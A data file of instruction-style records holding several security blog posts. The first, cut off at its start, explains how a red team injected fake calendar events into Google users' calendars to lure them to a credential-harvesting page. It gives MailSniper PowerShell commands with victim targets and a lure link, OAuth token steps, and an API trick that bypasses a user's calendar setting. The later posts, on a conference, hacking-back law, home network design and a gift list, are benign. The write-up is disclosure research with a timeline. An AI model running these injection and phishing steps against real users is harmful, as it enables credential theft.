Injection\u201d vulnerability, the risks associated with it, and how to exploit it using MailSniper.\n\nBlack Hills Information Security reported this issue to Google. See the section titled \u201cTimeline of Disclosure\u201d below for details.\n\nHistory\n\nWe were working on a red team assessment for a customer that we knew was going to be tough. It was discovered that this customer was utilizing G Suite For Business, which is one of Google\u2019s offerings for enterprise customers who would like to have their enterprise email and other services hosted by Google. Knowing this, we wanted to take a different approach to how we were going to attempt red teaming the environment.\n\nA few months earlier one of us had something interesting happen. A Google event notification popped up on the calendar stating that a booked flight was departing in 10 minutes. This was not a flight that the BHIS employee had booked. Opening up the event and checking where the source of the event creation came from, it was discovered that the event was generated from an email that had been sent. A coworker had sent their flight itinerary in an email, and Google thought these details were a different BHIS employee\u2019s itinerary, and automatically added it to their calendar.\n\nIn researching how these events were being generated it was discovered that an email wasn\u2019t even necessary to create an event in someone\u2019s calendar. This can be very easily done manually through the Google Calendar UI. When you create an event and add guests, Google will ask you whether you would like to send invitations to the guests after saving it. Simply selecting \u201cDon\u2019t Send\u201d will save the event to the guest\u2019s calendar if it is a Google account and not send them an email.\n\nBHIS thought this could provide a very interesting situation for phishing users of a G Suite environment. As most users have been trained to spot phishing links in emails, and Google itself has a few protections against phishing Gmail users, we thought focusing on social engineering users through Calendar event may be more successful.\n\nEvent Injection & Social Engineering\n\nPossibly the most interesting element of the calendar is that it can create a sense of urgency simply by alerting a user to something. Perhaps the user completely \u201cforgot\u201d they had a meeting scheduled. If someone has their Google account linked to their phone it is possible to generate an alert for an event directly on their phone as well as email to their account. When it comes to the ruse that is used the skies are limitless. One ruse we had great success with for this particular red team assessment was an \u201cAll Hands Meeting\u201d that was happening in 10 minutes. In the body of the event, we included text pointing the victim to an agenda that was required to be read before the meeting.\n\nThe site linked in the body of the event hosted a fake Google authentication page that captured their credentials and redirected the user to the fake agenda (more on that fake authentication page using CredSniper in part II of this post). This method proved to be highly successful.\n\nInvoke-InjectGEvent & Invoke-InjectGEventAPI\n\nNew modules have been added to MailSniper for injecting events into target calendars. The first method (Invoke-InjectGEvent) only requires a set of Google account credentials. The second method (Invoke-InjectGEventAPI) we\u2019ll discuss involves connecting directly to the Google API. To use MailSniper to inject events into a Google calendar first import MailSniper.ps1 (https://github.com/dafthack/MailSniper) into a PowerShell session.\n\nPS C> Import-Module MailSniper.ps1\n\nNext, you will need a Google account. If you are attempting to social engineer an organization, a potential idea would be to perform some reconnaissance on the target organization, find an employee of high rank, and sign up for a Gmail account under a similar name. This way when the target sees the event pop up in their calendar the organizer\u2019s name looks somewhat familiar. Those credentials can then be used with the Invoke-InjectGEvent module as follows:\n\nPS C> Invoke-InjectGEvent -EmailAddress \u2018emailaddressofattacker@gmail.com\u2019 -Password \u2018attackerpassword\u2019 -EventTitle \u2018Title of Event\u2019 -EventLocation \u2018https://global.gotomeeting.com/join/123456890\u2019 -EventDescription \u2018Summary of the event... Maybe include link to a fake Google Auth Page\u2019 -StartDateTime 20171031T160000 -EndDateTime 20171031T163000 -Targets \u2018victim@gmail.com\u2019\n\nThis will create an event in the target\u2019s calendar provided they haven\u2019t disabled the \u201cautomatic event add\u201d feature that we\u2019ll discuss more in a moment.\n\nThere are a few settings that can be set within Google Calendar to prevent events from automatically being added to the calendar. The first setting is called \u201cEvents from Gmail\u201d and there is a checkbox called \u201cAdd automatically\u201d. If this checkbox is checked then Google will automatically add events from emails sent to a Gmail account (similar to the flight itinerary mentioned above).\n\nThe second setting is called \u201cAutomatically add invitations to my calendar\u201d. There are three options here including:\n\nYes\n\nYes, but don\u2019t send event notifications unless I have responded \u201cYes\u201d or \u201cMaybe\u201d\n\nNo, only show invitations to which I have responded.\n\nWith the first setting this only prevents events from being added if the sender actually sends you an email invitation. Simply performing the manual steps listed earlier to create a calendar entry without sending a notification still works there. The second setting is a bit more interesting. There is an option that states \u201cNo, only show invitations to which I have responded\u201d. This prevents the first method of injecting events from working. However, BHIS found that it is possible to set the target\u2019s response status to \u201cAccepted\u201d using the Google API. This effectively bypasses this security setting.\n\nA module called Invoke-InjectGEventAPI has been added to MailSniper for injecting these types of events via the Google API. In order to connect to the Google API, there are a few steps that must be taken first to get an API Access token.\n\nA. Login to Google using the account you want to inject the event as.B. Go to https://console.developers.google.com/flows/enableapi?apiid=calendar&pli=1.C. Create/select a Project and agree to ToS and continue.\n\nD. Click \"Go to Credentials\".E. On the \"Add credentials to your project\" page click cancel.F. At the top of the page, select the \"OAuth consent screen\" tab. Select an Email address, enter a Product name if not already set, and click the Save button.G. Select the Credentials tab, click the Create credentials button and select OAuth client ID.H. Select the application type Web application, under \"Authorized redirect URIs\" paste in the following address: https://developers.google.com/oauthplayground\". Then, click the Create button.\n\nI. Copy your \"Client ID\" and \"Client Secret\".J. Navigate here: https://developers.google.com/oauthplayground/.K. Click the \"gear icon\" in the upper right corner and check the box to \"Use your own OAuth credentials\". Enter the OAuth2 client ID and OAuth2 client secret in the boxes.\n\nL. Make sure that \"OAuth flow\" is set to Server-side, and \"Access Type\" is set to offline.M. Select the \"Calendar API v3\" dropdown and click both URLs to add them to scope. Click Authorize APIs.\n\nN. Select the account you want to authorize, then click Allow. (If there is an error such as \"Error: redirect_uri_mismatch\" then it's possible the changes haven't propagated yet. Just wait a few minutes, hit the back button and try to authorize again.).\n\nO. You should now be at \"Step 2: Exchange authorization code for tokens.\" Click the \"Exchange authorization code for tokens button\". The \"Access token\" is the item we need for accessing the API. Copy the value of the \"Access token\".\n\nNow that you have a Google account that can access the Google API you can use the MailSniper module Invoke-InjectGEventAPI to inject an event bypassing the security settings mentioned previously. Take note that the \u201cAccess token\u201d expires after 3600 seconds. A module for refreshing this token is planned to be added into MailSniper soon, but simply clicking the \u201cRefresh access token\u201d button shown in the previous screenshot will generate a new one.\n\nAfter importing MailSniper into a PowerShell session as previously shown the following command can be used to inject an event into a target\u2019s calendar using the Google API.\n\nPS C> Invoke-InjectGEventAPI -PrimaryEmail your-api-email-address@gmail.com -AccessToken 'Insert your access token here' -Targets \"CEOofEvilCorp@gmail.com,CTOofEvilCorp@gmail.com,CFOofEvilCorp.com\" -StartDateTime 2017-10-22T17:20:00 -EndDateTime 2017-10-22T17:30:00 -EventTitle \"All Hands Meeting\" -EventDescription \"Please review the agenda at the URL below prior to the meeting. https://definitelynotmalicious.com\" -EventLocation \"Interwebz\"\n\nThe reason this bypasses the security setting is due to the fact that the Google API has a writable property on events called attendees[].responseStatus that can be set to \u2018accepted\u2019. Setting this when creating an event effectively makes it appear that a target has already accepted the event.\n\nConclusion\n\nAs of the date this blog was posted it is possible to inject events into Google calendars without a victim being able to prevent it. Additionally, it is not necessary for an email invitation to be sent for that event, so it\u2019s possible to directly inject events into a Google user\u2019s calendar without them ever receiving a notification. This presents a very unique opportunity for social engineering Google users. Black Hills Information Security reported this issue to Google. See the section titled \u201cTimeline of Disclosure\u201d below for details.\n\nStay tuned for part II of this post where we discuss CredSniper, a brand new framework for phishing Google users including the capture of various two-factor authentication tokens.\n\nTimeline of Disclosure\n\nOct 9 - BHIS discloses event injection with and without Calendar API to Google\n\nOct 9 - Google sends automated response\n\nOct 10 - Google triaged report\n\nOct 17 - Google release Calendar update (silently adds Calendar setting to disable injection)\n\nhttps://blog.google/products/g-suite/time-refresh-introducing-new-look-and-features-google-calendar-web/\n\nNo updates to BHIS initial report\n\nOct 27 - BHIS publicly discloses event injection at WWHF\n\nOct 31 - Google responds stating it\u2019s a feature and the settings provide users the ability to disable\n\nOct 31 - BHIS updates Google with step-by-step procedures to bypass settings\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Stargazing at Wild West Hackin Fest\"\nTaxonomies: \"Fun & Games, Wild West Hackin' Fest, WWHF, WWHF Lab, WWHF Speakers\"\nCreation Date: \"Mon, 06 Nov 2017 21:22:45 +0000\"\nGail Menius//\nThe sky is clear, the air is so cool and crisp with the small dusting of snow muting the sounds of Deadwood you can almost hear the stars and how brightly they shine at the Wild West Hackin\u2019 Fest. These stars are not the balls of glowing gasses in the sky (even though they are magnificent here), these stars are the \u201cstars\u201d of the infosec community. These stars shine brightly not just because they are successful in their career, they shine brightly because their character and disposition are exemplary. I was shocked because everywhere I turned was someone that had a wonderful heart and a healthy way to live that I wanted for myself. Does that normally happen at a tech conference? Here are some examples of the kind of stars I saw over the weekend:\nPlayful\nDuring the closing ceremony, one woman had a Masterlock in her hand, had taken off her lock pick earrings, and was testing out her new toys. I want to be playful like Sally.\n\nKind\nThe first morning of the conference, we ran out of coffee. There was a kind woman who wanted our conference to go well and said, \u201cThe conference can be amazing, but if you run out of coffee, that\u2019s all they\u2019ll talk about! They\u2019ll go home and say, \u2018Great talks, but they ran out of coffee.\u2019\u201dShe is responsible for GravWell, unexpectedly sponsoring coffee for us. I want to be kind like @Sweet_Grrl\nTenacious\nAt the hardware hacking lab, I was busy identifying the pins on a wireless router. As I turned the laminated pages and studied the JTAGULATOR\u00ae and its soldered wires, I considered the time it took to put together those labs.\n\n I want tenacity like Brian, David, and Rick, Joe, Ethan, BB King, Chevy, Kent and Jordan.\n\nBalanced\nOne of the speakers spoke about how balance was important in life. He goes for a walk in the morning, a long walk. He also spends time with family. I want to be balanced like Ed.\n\nActive\nThose beautiful five people who were up at six o\u2019clock in the morning during Wild West Hackin\u2019 Fest on Saturday morning. Those people went out for a run. They were able to see the morning like no one else at the conference that morning could. I want to be active like John, Erica, Christine, Robin, and Nicholas.\nConsiderate\nThere was a woman who knew she was a part of a community bigger than herself. She considered the implications of digital currency and what it would mean to people who didn\u2019t have access to the internet. She gave a talk about how we had the power and the intellect to understand how money works and how we were responsible for considering all those in our global economy, not just people in our country, not just people who had access to bitcoin, debit cards, and the like. I want to be considerate like Tarah.\nThese are just a handful examples of the kinds of stars I saw. Most people were friendly, motivated, focused, and considerate. I could go on, but I do have a job to do at BHIS! I felt very blessed to be a part of something where there was a sense of community. People were concerned with not only how they affected others in the industry, but how they effect their families and the world. Thanks, Wild West, Hackin\u2019 Fest for showing me what it was like to be surrounded by stars in the beautiful Black Hills of South Dakota. Now I remember who I want to be.\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Debating the Active Defense Law.. Because Arguing is Fun\"\nTaxonomies: \"Author, Blue Team, John Strand, Active Defense, ADHD, Arguing is Fun, Debates, Law, No Debate is Finished Until Hitler Is Mentioned\"\nCreation Date: \"Fri, 17 Nov 2017 14:18:12 +0000\"\nJohn Strand // \n\nI wanted to take a few moments and address the \u201cHacking Back\u201d law that is working people up. There is a tremendously well-founded fear that this law will lead to mass confusion, collateral damage and some say\u2026 possibly war.\n\n \u201cAt least they have not brought me up in this debate... Yet.\u201d - A. Hitler \n\nWhile some of these fears are a bit unfounded they are still legitimate and need to be discussed clearly. Further, we need to back away from the extreme fringes of this debate. Unfortunately, the discussion has dissolved into whether hacking back is good or bad, with little wiggle room in between.\n\nTo be clear, I think the law as it stands now is a bad idea. However, I do believe that with a few tweaks it can be saved and possibly even made useful.\n\nThere are two sections of the law that cause me to pause and, I think, are the cause of concern for most security professionals. Basically, it is the section that would allow the following:\n\n(bb) disrupt continued unauthorized activity against the defender\u2019s own network; or\n\n(cc) monitor the behavior of an attacker to assist in developing future intrusion prevention or cyber defense techniques; but\n\nYeah, that is where this law crosses the line. Through the removal of those two lines, and possibly a few more tweaks, it can be saved.\n\nLet\u2019s back up for a few seconds and cover what it may allow. First, in Section 3 the law allows for the use of Attributional Technology. This would be technology that would allow an organization to take measures to identify where an attacker is. In the Active Defense Harbinger Distribution we have things like this in the form of Word Web Bugs and various apps and programs that will call back when executed.\n\nThe components in ADHD that do this were designed to be in line with previous case decisions such as Susan-Clements vs. Absolute Software where Judge Rice ruled:\n\nIt is one thing to cause a stolen computer to report its IP address or its geographical location in an effort to track it down, it is something entirely different to violate federal wiretapping laws by intercepting the electronic communications of the person using the stolen laptop.\n\nThis creates a clear and sane line for defenders to follow.\n\nAnd, to be fair, this law follows that line of reasoning, up until sections 3-2-bb and 3-2-cc.\n\n The line\u2026 You crossed it. \n\nWith these two sections this law, I feel, is crossing a dangerous line. By continuing to monitor a system there is a strong possibility that the defender will be monitoring the activities of an unsuspecting third-party victim of the attacker. By degrading the ability of an attacker to attack, there is a strong possibility of degrading a third-party system.\n\nEither way, I think it would be in the interests of the community at large to stop simply breaking this conversation into bad and not bad camps. There is plenty of room in the middle to find new and inventive ways to detect bad guys without breaking existing laws or impacting third parties.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Home Network Design - Part 1\"\nTaxonomies: \"Ethan Robish, How-To, InfoSec 201, Cisco, guest networks, home network, home networking, how to set up your home wifi, how to set up your internet at home, Routers, wi-fi\"\nCreation Date: \"Wed, 22 Nov 2017 15:27:45 +0000\"\nEthan Robish //\n\nIn this series of posts, I'll discuss how I segmented my home network using VLANs and how I moved away from using a risky consumer-grade router at the edge of my network. My goal for this series is to take you from using a consumer-grade router running a flat network to a segmented network as cheaply as possible. I'll also touch on easier, more advanced, and more expensive options so you know what's available.\n\nI began with a network like most people: completely flat behind a single consumer-grade wireless router that serves all my household\u2019s devices. I have a few wired systems, but the majority of my connectivity is wireless due to convenience and lack of cabling in my house. My initial motivation was to separate out a guest network for friends and family who come to visit. But then I thought, \u201cWhy not take it a step or two further and segment some of my home devices as well?\u201d\n\nIf you\u2019re Cisco certified or architect networks for a living, this post isn\u2019t for you (though you could probably teach me quite a bit). Likewise, if you already have something other than an off-the-shelf router from a big box store, then I would point you to Troy Hunt\u2019s article (https://www.troyhunt.com/ubiquiti-all-the-things-how-i-finally-fixed-my-dodgy-wifi/) on how he configured his home network. Although, you can certainly skim through this post to see some of the other options available to you that you might not be aware of.\n\nIn this post, I will start by going over general terminology and some of the different options available to you.\n\nNetwork Topologies\n\nIn the diagrams below I'll ignore any modem or other devices you have to interface with your ISP. The device you'll see connected to the internet in my diagrams has a publicly routable IP address. This first diagram shows the starting point of my network (and probably yours too).\n\nThe easiest solution that would meet my initial goal would be to simply set up a guest wireless network. Here are a couple of options to satisfy that goal.\n\n1. Single Wireless Router with a Guest SSID - If your wireless router supports this (mine didn\u2019t), all this takes is a couple of minutes in your router's configuration to set up the new guest network. Your consumer-grade router will hopefully take care of all the networking configuration behind the scenes to segregate the two networks. You can even turn on Wireless Isolation mode which will prevent your guests' devices from being able to communicate with each other on their network; they will only be allowed to communicate with the internet. This is definitely the \u201ceasy\u201d button and won\u2019t let us understand the inner workings very well.\n\n2. Wireless Routers in Parallel - This setup gets a little more complicated, but it is basically two copies of the flat network setup. It involves a separate wireless router for both the home network and guest network. Each router has the default NAT, DHCP, and firewall configuration that would come with your typical consumer wireless router. The two networks are then allowed out to the internet through a third router device. It doesn't matter if this is wireless or not since you wouldn't be using the wireless capability in this scenario. The networks are segmented because, from the point of view of each of the wireless routers, anything on the other side (your third router) is treated just like internet traffic. There are a whole bunch of ways you can tweak this setup and it can start to get more complicated. I won't go into any more details, but my point is you could take some basic gear you find at rummage sales or have laying around, plug it in, and with very little configuration it will just work.\n\n3. Wireless Routers in Series - What if you only have two wireless routers? The diagram below shows a valid configuration as well, but I prefer #2 above for a couple of reasons: 1) The networks will not be properly segmented in this scenario, and 2) the gateway for the home network is in the guest network. This means that in the following diagram, devices in the home network will be able to initiate communication with devices in the guest network (but not vice versa). You may be able to disable this if your router lets you add static routes, but by default, the routes will be there. It also means that if a particularly nasty device got on your guest network it would have the possibility to Man-in-the-Middle your home network's gateway through an attack like ARP spoofing and inspect all your unencrypted traffic going to/from the internet.\n\nAffordable Options\n\nThe consensus from what I've read is that you'll have much better results (i.e. network performance) by using purpose-built devices over all-in-one devices. What I mean by that is instead of the all-in-one consumer-grade wireless routers that we currently have, you'd have one device for a firewall, one for a router, potentially multiple switches, and multiple wireless access points (more on that below). Each new device will also increase the cost and complexity, so we need to make sure we weigh the benefits against the costs before diving in.\n\nHere are several options that I considered for my edge router.\n\nConsumer Device Running DD-WRT or Open-WRT - If you have a device that supports flashing open-source firmware such as DD-WRT or Open-WRT you could turn your consumer-grade device into something exponentially more configurable. Personally, I haven't had the greatest luck with either of these though some people swear by them.\n\nTrue Enterprise Level Devices such as Cisco - These are typically rack mount (read: big) and not affordable new for a home network. This is definitely a valid route to go if you have space and want to learn a marketable skill. I hear that used Cisco devices can be quite affordable on eBay.\n\nEnterprise Cisco gear will look like this:\n\nNot this:\n\nEnterprise Quality Devices at Consumer Prices - You can buy something that has most of the configurability of the Cisco devices above but for the price of a consumer-grade router. The two big contenders I've run across are Mikrotik and Ubiquiti. My impressions are that Mikrotik devices are cheaper and don't hold your hand as much as Ubiquiti. Ubiquiti devices are much sleeker looking, both in their physical appearance and in the graphical interface   \n\nSide note:\n\nIf Ubiquiti sounds more interesting to you, I definitely recommend reading Troy Hunt\u2019s article. I drool over the type of setup he ended up with, but I didn\u2019t want to spend that kind of money and I didn\u2019t want to try and run ethernet cables through my walls. \n\nhttps://www.troyhunt.com/ubiquiti-all-the-things-how-i-finally-fixed-my-dodgy-wifi/\n\nhttps://arstechnica.com/gadgets/2015/10/review-ubiquiti-unifi-made-me-realize-how-terrible-consumer-wi-fi-gear-is/ \n\nBuild Your Own Router/Firewall - You can take almost any old computer you have lying around, slap one of these free or open-source OS's on it, and have something that performs better as a router/firewall than most off the shelf products you can buy. With this option, you'll need to purchase a managed switch and a wireless card or access point separately. I don't have any personal experience yet here, so the suggestions below are purely based on my research. https://pfsense.org/ - The de facto standard OS for a DIY firewall. I would personally try OPNsense first before pfSense to see if it does what I need, but that might just be my penchant to cheer for the underdog. Again, I don\u2019t have the first-hand experience with either software so feel free to choose the one that suits you best. https://opnsense.org/ - OPNsense is fully open source, has a nice list of features, and a spiffy looking web UI. Originally this was a fork of pfSense, but now they claim they have rewritten nearly all the original code. I like that they seem to patch security issues and implement new features earlier than pfSense. Like Pfsense, it is also built on top of FreeBSD. http://blog.packetheader.net/2016/03/how-to-create-soho-router-using-ubuntu.html - Joff Thyer has a writeup on how to get started by utilizing open source services on a Linux system to configure your own router. This will definitely give you the most control out of any option, but it's also likely going to take the most time unless you are a packet wizard-like Joff. If you fall into that category, why are you still reading this? :) \n\nhttps://vyos.io/ - This is a Linux distribution that supplies a management interface for many great open-source tools. Their website states \"Unlike OpenWRT or pfSense, VyOS is more similar to traditional hardware routers.\" This is going to be similar to the DIY Linux solution suggested by Joff, but probably easier to use due to the central interface. However, everything is still done from the command line as VyOS lacks a GUI.\n\nhttps://www.sophos.com/en-us/products/free-tools/sophos-utm-home-edition.aspx - On the other end of the DIY spectrum is Sophos UTM (Unified Threat Management) Home Edition. While not open-source, it is free. It has a slick web UI, but definitely looks more geared towards firewall and filtering services than low level routing. \n\nHonorable Mention:\n\nThe latest craze these days has been \u201cwhole home Wi-Fi\u201d and \u201cmesh networking\u201d systems. These have always existed for the dedicated DIYer such as yourself, but lately, companies such as Google and Eero have created consumer kits that make the installation and setup dead simple. This is certainly a great option for excellent Wi-Fi coverage without extra cabling, but as these devices are meant to be used by a non-technical audience, they don\u2019t meet my requirement that will allow segmenting wireless networks on different VLANs.\n\nTerminology\n\nUp until this point, I've been pretty liberal using terms like \"access point\" and \"router\". To discuss things further I'll have to be a little more careful with my terminology. I've explained several terms below in my own words and purposely simplified some of the concepts because they aren't needed in what follows. I\u2019m sure my understanding is not perfect, but it has worked well enough so far. If I'm wrong on some major point please reach out and let me know.\n\nWireless Access Point (AP) - This is simply the wireless base station that will send and receive signals with your wireless client device (e.g. phone, tablet, laptop). The AP will then send the packets on to the wireless controller, switch, or router it's connected to. Wireless APs will have a transmit power measured in milliWatts and antennas measured in dBi that determine their range. Multiple APs can work together to host the same wireless signal and cover a larger area, but these APs must be wired together using ethernet cables.\n\nHubs - OSI layer 1 device (think electrical wires). Any packet received on any physical interface is sent to every other physical interface. This means that if you have a system plugged into one interface, you'll be receiving traffic from all other systems on the same hub regardless if the traffic is directed at you. I won't be using a hub, but I mention them to highlight the difference between a hub and a switch.\n\nSwitches - OSI layer 2 device (think MAC addresses) that forwards packets between its different physical interfaces (aka ports). Unlike a hub, a switch keeps an internal mapping between its ports and the MAC address associated. It uses this knowledge to only forward packets to the correct ports rather than all ports. Normally, this mapping is automatically populated by the switch listening to the first packets sent from each port.\n\nRouters - OSI layer 3 device (think IP addresses) that keeps an internal routing table. The routing table is where the router stores which subnets are available (e.g. 192.18.1.1/24) and which physical interface is the best to reach that subnet. The routing table can be populated manually using static routes, or automatically by communicating with other routers using routing protocols such as OSPF, EIGRP, RIP, BGP, and EGP. When a packet comes into the router, it consults the routing table to determine where to send the packet out again.\n\nFirewalls - OSI layer 3+ device that inspects every incoming or outgoing packet and applies a set of rules that determine what action to take. That's a pretty vague statement, but it's because firewalls can be configured to do so many different things and operate on many different OSI layers. Basically, a firewall is configured with a series of rules that allow or deny traffic with certain characteristics. The firewall uses the information contained within each packet along with information it has stored about recently seen packets in order to apply these rules.\n\nHere are some examples:\n\nAllow inbound traffic from certain IP addresses to pass (Layer 3).\n\nBlock traffic destined to specific TCP ports (Layer 4).\n\nAllow inbound packets that correspond to an already established session (Layer 3).\n\nInspect HTTP traffic and block access to certain URLs (Layer 7).\n\nAdditional Information:\n\nReddit user monoman67 gives a succinct comparison between a router and a firewall. \u201cA router is a layer 3 device used to allow LANs to communicate with each other. A firewall is a layer 3-7 device used to limit traffic between LANs.\u201d\n\nhttps://www.reddit.com/r/networking/comments/26aa04/whats_the_key_difference_between_a_firewall_and_a/chp6k3f/\n\nThis article is a slightly longer, but still accessible description of the differences between switches, routers, and firewalls.\n\nhttps://developcents.com/2013/08/12/routers-switches-firewalls-differences/\n\nHere\u2019s another article that does a little wider survey with an infosec flair if you\u2019re interested. Oh, and it\u2019s full of memes.\n\nhttps://medium.com/@louiscremen/10-things-infosec-professionals-need-to-know-about-networking-d159946efc93\n\nThose are the theoretical definitions (or at least my take on them). However, things get confusing because the devices sold in stores often take on more than one of the roles described above. For instance,\n\nLayer 3 Switches - These are switches (remember, think MAC addresses) with layer 3 capabilities (think IP addresses). Essentially, these are just routers. They may not have all the capabilities normally associated with a router, but for our purposes, they function the same.\n\nRouters with Hardware Switching - I mention this because the Mikrotik device I'll be using has this feature. Basically, it boils down to speed. In order to make routing decisions packets have to be sent to the CPU, which takes time. But by configuring a group of ports to function as a switch, packets can be sent at \"wire speed\" (fast). You lose the benefits of routing by IP address, but you have the ability to trade that for speed when your specific situation allows.\n\nEnterprise Firewall Appliances- These are most likely going to have routing capabilities. It's possible to have a pure firewall that sits inline without routing, but in order to be competitive in the market, basic routing functionality is included. This allows customers to buy one hardware device instead of two.\n\nConsumer-Grade Wireless Routers - These are the devices you find in most people's homes. Each acts as a firewall, router, and switch. The firewall functionality is there to protect you against attacks from the internet and is what keeps your devices from being compromised the moment you go online. I'm not sure if these devices have true layer 2 switch functionality, but for our purposes, it doesn't matter.\n\nIn the next post, I\u2019ll work through a way to determine how to group and segment your devices.\n\nRead Part 2 here: https://www.blackhillsinfosec.com/home-network-design-part-2/ \n\nCredits:\n\nIcons and diagrams are from yEd and Cisco\n\nhttps://www.yworks.com/products/yed\n\nhttps://www.cisco.com/c/en/us/about/brand-center/network-topology-icons.html\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"BHISs 2nd Annual Infoseckers* Gift-List\"\nTaxonomies: \"Fun & Games, christmas gifts, christmas gifts for nerds, gift guide, infosecker gift list\"\nCreation Date: \"Mon, 27 Nov 2017 14:41:13 +0000\"\nSierra Ward with help from all //\nWow, another year, another Christmas and another chance to be totally stumped by what to get you favorite InfoSecker.\nBut fear not! We are here with another riveting installment of the BHIS Christmas Gift Guide/Our Tester Wish List! This is divided by price point more than topically\u2026 It\u2019s a mish-mash.\nWondering what was on the list last year? Here that.\n \nStocking Stuffers\nCyber Attribution Dice - $10 (different colors available)\nhttps://www.etsy.com/listing/508651937/cyber-attribution-dice-set-pinkblack\nOne of my favorite things on this list\u2026. Remember that threat intelligence feed that John hates soooo much? Well we found a better solution, and way cheaper too - and JUST as accurate!  Ethan said it reminded him of http://www.bofhcalendar.com/ ah, Blue Team, we <3 you it was a rough year! \nScrewdriver Pen - $6\nhttps://www.amazon.com/Maxcraft-60609-Precision-Pocket-Screwdriver/dp/B003BXS4T2/\nSo handy, so small, so perfect for stockings!\nYubiKey: https://www.yubico.com/ $20 - $50\nDid you NOT read Beau and Mike\u2019s blog about hacking 2FA in Google? Do you even Yubikey, Brah?? Give them the gift of better security.\n \n\u201cPowerShell\u201d Car charger - $10\nBrilliant, hilarious and punny! Sadly, Amazon is out of stock but it can still be found on eBay.\n\nPacket Squirrel: https://www.hak5.org/gear/packet-squirrel ~$ 60\nChristmas is for toys, what\u2019s better than hacking toys? Really the testers say they'd love anything from Hak5, but the Packet Squirrel is new, ya know so get to manning-in-the-middle all those networks!\nRFID blocking sleeves - $8\nhttps://www.etsy.com/listing/237352364/rfid-blocking-sleeves-3x-passport-10x\nJordan said, \u201cWhoa! These are very cool.\u201d I\u2019ve come to learn that everyone is very paranoid, so playing to that hand with gifts is fitting. (Want something a little nicer? See the Ridge wallet below.)\nCable Organizer - $16 - because soooo many cords, wires and cables\u2026.\n\nhttps://www.amazon.com/BAGSMART-Organizer-Portable-Electronics-Accessories/dp/B01AU5YV40/\nCircuit board tie clip - $17\nYou may not wear a tie every  day (or any day) but when you do, you can let your nerd shine through!\nhttps://www.etsy.com/listing/255124041/short-tie-bar-for-a-skinny-tie-circuit\n\nAnd apparently Beau really REALLY has a death wish, because he\u2019s requesting this for the second year in a row:  Death Wish Coffee - https://www.deathwishcoffee.com/\n \nGifts <$50\nGlobe Ice Cube Molds - $9\nhttps://www.amazon.com/dp/B00KI7QZ5Y/\nBB asked how you get the ice so clear, answer: you boil it first. Seems weird, but it helps get all those teensy air bubbles out before freezing.\n \nSolar battery packs - you know... for when the power grid is hacked.\nThese range in price, this one is only $17 https://www.amazon.com/FLOUREON-Waterproof-Cellphones-Flashlight-Emergency/dp/B073XD2GJT/ref=sr_1_4?s=wireless&ie=UTF8&qid=1511380314&sr=1-4&keywords=solar+power+charger\nPocket wireless filehub thingy, RAVPower FileHub Plus, Wireless Travel Router, SD Card Reader USB Portable Hard Drive Companion, DLNA NAS Sharing Media Streamer 6000mAh External Battery Pack, to be exact - $40 from Amazon\nhttps://www.amazon.com/RAVPower-Wireless-Portable-Companion-Streamer/dp/B016ZWS9ZE/ref=sr_1_1?s=electronics&ie=UTF8&qid=1510798768&sr=1-1&keywords=rav+power+wireless+filehub\n\nThat title though\u2026. I feel like I\u2019m describing my Red Rider b.b. gun to Santa and I can\u2019t even take a breath the title/feature list is so long!\nMouse with a spider inside - $23\nJust to be clear, this is NOT my idea of a good time! But apparently people (like Jordan) think it\u2019s hilarious and also awesome\u2026 \nhttps://www.amazon.com/gp/aw/d/B002UG1PZ6/ref=mp_s_a_1_3?ie=UTF8&qid=1510674187&sr=8-3\u03c0=AC_SX236_SY340_FMwebp_QL65&keywords=spider+mouse\nBB echoed my sentiments with this thought, \u201cWhat the \u2026 why do you hate us, Jordan?\u201d\nTo which Jordan replied, \u201cSeriously, how do you not love this??????????????????\u201d\nAnd Ethan replied with:\n\nYes, Ethan, that IS What my desk would look like if I found that spider alive anywhere in my house!\nLooking for a gift for new parents? Baby onesie - $16\n\nhttps://www.etsy.com/listing/277968952/living-proof-that-nerds-get-laid-funny\nArduino Uno 3 Ultimate Starter Kit Includes 12 Circuit Learning Guide - $45\n\nhttps://www.amazon.com/gp/aw/d/B00BT0NDB8/ this really does look fun! \nRetro inspired keyboard - $26\nThese appear to be all the rage with millennialals these days. All of the jazzy old-fashionedness without the inability to delete.\n\nhttps://www.amazon.com/Mechanical-Keyboard-Steampunk-Magicforce-Qisan/dp/B01MQITHLV/ref=sr_1_2_sspa?s=electronics&ie=UTF8&qid=1511383675&sr=1-2-spons&keywords=retro+keyboard&psc=1\nJackknife lock picks - $40 recommended by our keenest lock picker, Kelsey. Ethan also added, \u201cI learned to pick with one similar to this and still have one.\u201d\n\nhttp://www.southord.com/Lock-Pick-Tools/Jackknife-Pocket-Lock-Pick-Sets.html\nRick & Morty Things - because everybody loves Rick and Morty (though the marketing dept. has never really understood why)... Out shopping the other day I saw tons of figurines and sets in the toy department (\u2026also, is this REALLY a kids show??), so perhaps any of those? But why not the \u201cofficial\u201d coloring book?! -$11 (must be an Amazon best-seller for a reason!) InfoSec is stressful, coloring helps. https://www.amazon.com/Rick-Morty-Official-Coloring-Book/dp/1785655620/\nIf you\u2019re looking for something less creepy than the spider mouse, look no further than this color changing glowing water droplet. And it has a face so it also looks friendly.\nNightlight - $13\nhttps://www.amazon.com/dp/B01MRSTKD1/\nOr maybe you DO want it to be creepy. Ethan suggests pairing it with the spider mouse and with the help of some of the other toys having it make creepy sounds as well as change colors\u2026. Hmmm\u2026 ideas abound.\nDeath Star Waffle Maker - $40\n\nNothing says Christmas morning, or for that matter, breakfast, like a death star waffle! http://www.thinkgeek.com/product/huik/\nWhat would Christmas be without games? (I mean real games here, not kits to solder stuff) \u201cWhat Do you Meme?\u201d - $30 looks like Cards Against Humanity, or Apples to Apples, but with memes. Maybe it\u2019s just my marketing love for funny gifs\u2026 (sooo many gifs!) Either way, I\u2019ve added it to my own wish list. https://www.amazon.com/What-Meme-Adult-Party-Game/dp/B01MRG7T0D/\nGifts $50-$100\nMikrotik portable router - for when you need to connect all the things with wires. http://a.co/1GRAt2e ~$60\nMagnetic card stripe writer - $70\nMore fun and games all Christmas vacation long!\nhttps://www.amazon.com/Deftun-MSR605X-Magnetic-Stripe-Encoder/dp/B01DUCCEWQ/ref=sr_1_1?ie=UTF8&qid=1510798271&sr=8-1&keywords=magnetic+stripe+writing\nRemember how I said Id never met anybody in this industry that wasn\u2019t crazy paranoid? If you want something a little nicer than just the 